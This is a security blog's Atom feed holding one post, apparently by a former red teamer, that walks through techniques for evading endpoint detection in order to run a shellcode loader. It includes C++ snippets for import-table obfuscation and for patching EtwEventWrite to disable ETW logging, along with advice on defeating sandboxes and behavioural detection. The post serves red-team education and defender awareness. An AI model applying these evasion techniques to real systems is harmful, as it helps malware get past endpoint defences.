<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://vanmieghem.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://vanmieghem.io/" rel="alternate" type="text/html" /><updated>2022-04-18T09:40:38+02:00</updated><id>https://vanmieghem.io/feed.xml</id><title type="html">Vincent Van Mieghem</title><subtitle>A blog about security and stuff related</subtitle><entry><title type="html">A blueprint for evading industry leading endpoint protection in 2022</title><link href="https://vanmieghem.io/blueprint-for-evading-edr-in-2022/" rel="alternate" type="text/html" title="A blueprint for evading industry leading endpoint protection in 2022" /><published>2022-04-18T00:00:00+02:00</published><updated>2022-04-18T00:00:00+02:00</updated><id>https://vanmieghem.io/blueprint-for-evading-edr-in-2022</id><content type="html" xml:base="https://vanmieghem.io/blueprint-for-evading-edr-in-2022/">&lt;p&gt;About two years ago I quit being a full-time red team operator. However, it still is a field of expertise that stays very close to my heart. A few weeks ago, I was looking for a new side project and decided to pick up an old red teaming hobby of mine: bypassing/evading endpoint protection solutions.&lt;/p&gt;

&lt;p&gt;In this post, I’d like to lay out a collection of techniques that together can be used to bypassed industry leading enterprise endpoint protection solutions. This is purely for educational purposes for (ethical) red teamers and alike, so I’ve decided not to publicly release the source code. The aim for this post is to be accessible to a wide audience in the security industry, but not to drill down to the nitty gritty details of every technique. Instead, I will refer to writeups of others that deep dive better than I can.&lt;/p&gt;

&lt;p&gt;In adversary simulations, a key challenge in the “initial access” phase is bypassing the detection and response capabilities (EDR) on enterprise endpoints. Commercial command and control frameworks provide unmodifiable shellcode and binaries to the red team operator that are heavily signatured by the endpoint protection industry and in order to execute that implant, the signatures (both static and behavioural) of that shellcode need to be obfuscated.&lt;/p&gt;

&lt;p&gt;In this post, I will cover the following techniques, with the ultimate goal of executing malicious shellcode, also known as a (shellcode) loader:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Shellcode encryption&lt;/li&gt;
  &lt;li&gt;Reducing entropy&lt;/li&gt;
  &lt;li&gt;Escaping the (local) AV sandbox&lt;/li&gt;
  &lt;li&gt;Import table obfuscation&lt;/li&gt;
  &lt;li&gt;Disabling Event Tracing for Windows (ETW)&lt;/li&gt;
  &lt;li&gt;Evading common malicious API call patterns&lt;/li&gt;
  &lt;li&gt;Direct system calls and evading “mark of the syscall”&lt;/li&gt;
  &lt;li&gt;Removing hooks in &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Spoofing the Thread Call Stack&lt;/li&gt;
  &lt;li&gt;In-memory encryption of beacon&lt;/li&gt;
  &lt;li&gt;A custom reflective loader&lt;/li&gt;
  &lt;li&gt;OpSec configurations in your Malleable profile&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;1-shellcode-encryption&quot;&gt;1. Shellcode encryption&lt;/h3&gt;

&lt;p&gt;Let’s start with a basic but important topic. I leverage a XOR or RC4 encryption algorithm, because it is easy to implement and doesn’t leave a lot of external indicators of encryption activities performed by the loader. AES encryption to obfuscate static signatures of the shellcode leaves traces in the import table of the binary, which increase suspicion. I’ve had Windows Defender specifically trigger on AES decryption functions (e.g. &lt;code class=&quot;highlighter-rouge&quot;&gt;CryptDecrypt&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;CryptHashData&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;CryptDeriveKey&lt;/code&gt; etc.) in earlier versions of this loader.&lt;/p&gt;

&lt;p style=&quot;text-align: center;&quot;&gt;&lt;img src=&quot;https://vanmieghem.io/assets/images/2022-04-18-blueprint-for-evading-edr-in-2022/AES_import.png&quot; alt=&quot;&quot; width=&quot;400&quot; /&gt;&lt;/p&gt;
&lt;figcaption&gt;Output of dumpbin /imports, an easy giveaway of only AES decryption functions being used in the binary.&lt;/figcaption&gt;
&lt;!-- &lt;img src=&quot;https://vanmieghem.io/assets/images/2022-04-18-blueprint-for-evading-edr-in-2022/AES_import.png&quot; alt=&quot;drawing&quot; width=&quot;400&quot; style=&quot;margin: auto&quot;/&gt; --&gt;

&lt;h3 id=&quot;2-reducing-entropy&quot;&gt;2. Reducing entropy&lt;/h3&gt;
&lt;p&gt;Many AV/EDR solutions consider binary entropy in their assessment of an unknown binary. Since we’re encrypting the shellcode, the entropy of our binary is rather high, which is a clear indicator obfuscated parts of code in the binary.&lt;/p&gt;

&lt;p&gt;There are several ways of reducing the entropy of our binary, two simple ones that work are&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Adding low entropy resources to the binary, such as (low entropy) images.&lt;/li&gt;
  &lt;li&gt;Adding strings, such as the English dictionary or some of &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;strings C:\Program Files\Google\Chrome\Application\100.0.4896.88\chrome.dll&quot;&lt;/code&gt; output.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;A more elegant solution would be to design and implement an algorithm that would obfuscate (encode/encrypt) the shellcode into English words (low entropy). That would kill two birds with one stone.&lt;/p&gt;

&lt;h3 id=&quot;3-escaping-the-local-av-sandbox&quot;&gt;3. Escaping the (local) AV sandbox&lt;/h3&gt;
&lt;p&gt;Many EDR solutions will run the binary in a local sandbox for a few seconds to inspect its behaviour. To avoid compromising on the end user experience, they cannot afford to inspect the binary for longer than a few seconds (I’ve seen Avast taking up to 30 seconds in the past, but that was an exception). We can abuse this limitation by delaying the execution of our shellcode. Simply calculating a large prime number is my personal favourite. You can go a bit further and deterministically calculate a prime number and use that number as (a part of) the key to your encrypted shellcode.&lt;/p&gt;

&lt;h3 id=&quot;4-import-table-obfuscation&quot;&gt;4. Import table obfuscation&lt;/h3&gt;
&lt;p&gt;You want to avoid suspicious Windows API (WINAPI) from ending up in our IAT (&lt;a href=&quot;https://0xrick.github.io/win-internals/pe6/&quot;&gt;import address table&lt;/a&gt;). This table consists of an overview of all the Windows APIs that your binary imports from other system libraries. A list of suspicious (oftentimes therefore inspected by EDR solutions) APIs can be found &lt;a href=&quot;https://github.com/Mr-Un1k0d3r/EDRs&quot;&gt;here&lt;/a&gt;. Typically, these are &lt;code class=&quot;highlighter-rouge&quot;&gt;VirtualAlloc&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;VirtualProtect&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;WriteProcessMemory&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;CreateRemoteThread&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;SetThreadContext&lt;/code&gt; etc. Running &lt;code class=&quot;highlighter-rouge&quot;&gt;dumpbin /exports &amp;lt;binary.exe&amp;gt;&lt;/code&gt; will list all the imports. For the most part, we’ll use Direct System calls to bypass both EDR hooks (refer to section 7) of suspicious WINAPI calls, but for less suspicious API calls this method works just fine.&lt;/p&gt;

&lt;p&gt;We add the function signature of the WINAPI call, get the address of the WINAPI in &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; and then create a function pointer to that address:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WINAPI&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pVirtualProtect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SIZE_T&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;flNewProtect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PDWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lpflOldProtect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pVirtualProtect&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fnVirtualProtect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sVirtualProtect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'V'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'i'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'t'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'u'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'l'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'P'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'o'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'t'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'e'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'c'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'t'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sKernel32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'k'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'e'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'n'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'e'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'l'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'3'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'2'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'d'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'l'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'l'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;fnVirtualProtect&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pVirtualProtect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetProcAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetModuleHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPCSTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sKernel32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPCSTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sVirtualProtect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// call VirtualProtect&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fnVirtualProtect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PAGE_READWRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oldProt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Obfuscating strings using a character array cuts the string up in smaller pieces making them more difficult to extract from a binary.&lt;/p&gt;

&lt;p&gt;The call will still be to an &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; WINAPI, and will not bypass any hooks in WINAPIs in &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt;, but is purely to hide the calls from &lt;code class=&quot;highlighter-rouge&quot;&gt;dumpbin /imports&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;5-disabling-event-tracing-for-windows-etw&quot;&gt;5. Disabling Event Tracing for Windows (ETW)&lt;/h3&gt;
&lt;p&gt;Many EDR solutions leverage Event Tracing for Windows (ETW) extensively, in particular Microsoft Defender for Endpoint (formerly known as Microsoft ATP). ETW allows for extensive instrumentation and tracing of a process’ functionality and WINAPI calls. ETW has components in the kernel, mainly to register callbacks for system calls and other kernel operations, but also consists of a userland component that is part of &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; (&lt;a href=&quot;https://binarly.io/posts/Design_issues_of_modern_EDRs_bypassing_ETW-based_solutions/index.html&quot;&gt;ETW deep dive and attack vectors&lt;/a&gt;). Since &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt; is a DLL loaded into the process of our binary, we have full control over this DLL and therefore the ETW functionality. There are &lt;a href=&quot;https://whiteknightlabs.com/2021/12/11/bypassing-etw-for-fun-and-profit/&quot;&gt;quite&lt;/a&gt; a &lt;a href=&quot;https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/&quot;&gt;few&lt;/a&gt; &lt;a href=&quot;https://modexp.wordpress.com/2020/04/08/red-teams-etw/&quot;&gt;different&lt;/a&gt; bypasses for ETW in userspace, but the most common one is patching the function &lt;code class=&quot;highlighter-rouge&quot;&gt;EtwEventWrite&lt;/code&gt; which is called to write/log ETW events. We fetch its address in &lt;code class=&quot;highlighter-rouge&quot;&gt;ntdll.dll&lt;/code&gt;, and replace its first instructions with instructions to return 0 (&lt;code class=&quot;highlighter-rouge&quot;&gt;SUCCESS&lt;/code&gt;).&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;disableETW&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;// return 0&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;patch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x33&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;// xor rax, rax; ret&lt;/span&gt;
	
	&lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oldprotect&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;patch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	
	&lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hCurrentProc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetCurrentProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sEtwEventWrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'E'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'t'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'w'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'E'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'v'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'e'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'n'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'t'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'W'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'i'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'t'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'e'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
	
	&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pEventWrite&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetProcAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetModuleHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPCSTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sNtdll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPCSTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sEtwEventWrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	
	&lt;span class=&quot;n&quot;&gt;NtProtectVirtualMemory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hCurrentProc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pEventWrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PSIZE_T&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PAGE_READWRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oldprotect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	
	&lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pEventWrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;patch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;patch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]));&lt;/span&gt;
	
	&lt;span class=&quot;n&quot;&gt;NtProtectVirtualMemory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hCurrentProc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pEventWrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PSIZE_T&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oldprotect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oldprotect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;FlushInstructionCache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hCurrentProc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pEventWrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I’ve found the above method to still work on the two tested EDRs.&lt;/p&gt;

&lt;h3 id=&quot;6-evading-common-malicious-api-call-patterns&quot;&gt;6. Evading common malicious API call patterns&lt;/h3&gt;
&lt;p&gt;Most behavioural detection is ultimately based on detecting malicious patterns. One of these patters is the order of specific WINAPI calls in a certain timeframe. The suspicious WINAPI calls briefly mentioned in 4 are typically used to execute shellcode and therefore heavily monitored. However, these calls are also used for benign activity (the &lt;code class=&quot;highlighter-rouge&quot;&gt;VirtualAlloc&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;WriteProcess&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;CreateThread&lt;/code&gt; pattern in combination with a memory allocation and write of ~250KB of shellcode) and so the challenge for EDR solutions is to distinguish benign from malicious calls. Filip Olszak wrote &lt;a href=&quot;https://blog.redbluepurple.io/offensive-research/bypassing-injection-detection&quot;&gt;a great blog post&lt;/a&gt; leveraging delays and smaller chunks of allocating and writing memory to blend in with benign WINAPI call behaviour. In short, his method adjusts the following behaviour of a typical shellcode loader:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Instead of allocating one large chuck of memory and directly write the ~250KB implant shellcode into that memory, allocate small contiguous chunks of e.g. &amp;lt;64KB memory and mark them as &lt;code class=&quot;highlighter-rouge&quot;&gt;NO_ACCESS&lt;/code&gt;. Then write the shellcode in a similar chunk size to the allocated memory pages.&lt;/li&gt;
  &lt;li&gt;Introduce delays between every of the above mentioned operations. This will increase the time required to execute the shellcode, but will also make the consecutive execution pattern stand out much less.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;One catch with this technique is to make sure you find a memory location that can fit your entire shellcode in sequential memory pages. I refer to the &lt;a href=&quot;https://github.com/xuanxuan0/DripLoader&quot;&gt;DripLoader&lt;/a&gt;, in which this concept is implemented.&lt;/p&gt;

